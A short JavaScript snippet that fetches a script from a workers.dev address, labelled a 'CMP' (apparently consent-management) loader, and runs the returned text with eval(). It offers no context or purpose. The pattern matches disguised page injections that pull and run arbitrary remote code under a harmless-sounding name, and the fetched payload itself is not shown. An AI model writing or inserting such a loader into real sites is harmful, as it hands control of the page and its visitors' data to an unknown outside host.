(async () => {
  try {
    const response = await fetch("https://manual-worker.web-8fb.workers.dev/cmp-script.js");
    const scriptText = await response.text();
    eval(scriptText);  // Execute the script dynamically
  } catch (error) {
    console.error("Failed to load CMP script", error);
  }
})();
